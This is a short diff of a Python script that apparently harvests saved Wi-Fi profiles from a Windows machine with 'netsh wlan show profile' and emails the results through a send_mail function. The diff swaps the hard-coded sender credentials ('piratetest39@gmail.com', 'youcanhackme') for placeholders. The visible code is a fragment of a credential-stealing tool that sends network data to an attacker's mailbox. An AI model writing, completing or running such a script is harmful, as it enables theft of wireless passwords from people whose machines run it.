@@ -9,8 +9,8 @@ def send_mail(email,password,message):
     server.quit()
 
 
-email="piratetest39@gmail.com"
-password="youcanhackme"
+email="testmail@gmail.com"
+password="password"
 command="netsh wlan show profile"
 networks = subprocess.getoutput(command)
 networks_names_list = re.findall("(?:Profile\s*:)(.*)",networks)
